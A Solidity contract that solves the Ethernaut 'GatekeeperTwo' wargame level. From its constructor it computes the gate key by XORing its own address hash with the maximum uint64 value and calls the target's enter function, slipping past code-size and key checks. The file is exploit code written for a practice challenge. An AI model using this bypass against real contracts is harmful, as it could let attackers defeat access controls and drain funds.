// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GatekeeperTwo{
    function enter(bytes8 gateKey) external returns (bool);
}

contract EthernautGatekeeperTwo {
    constructor(address target) {
        GatekeeperTwo gkt = GatekeeperTwo(target);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gkt.enter(key);
    }
}